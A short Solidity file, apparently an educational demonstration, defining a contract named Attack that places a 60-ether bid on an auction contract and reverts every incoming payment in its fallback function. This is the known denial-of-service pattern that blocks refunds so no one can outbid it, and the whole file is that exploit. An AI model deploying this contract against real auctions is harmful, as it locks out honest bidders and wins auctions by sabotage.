//SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IAuction{
    function bid() external payable;
}

contract Attack{
    IAuction public auction;
    constructor(address _auction){
        auction = IAuction(_auction);
    }

    function putAuction() public payable{
        auction.bid{value: 60 ether}();
    }

    fallback() external payable{
        revert();
    }

}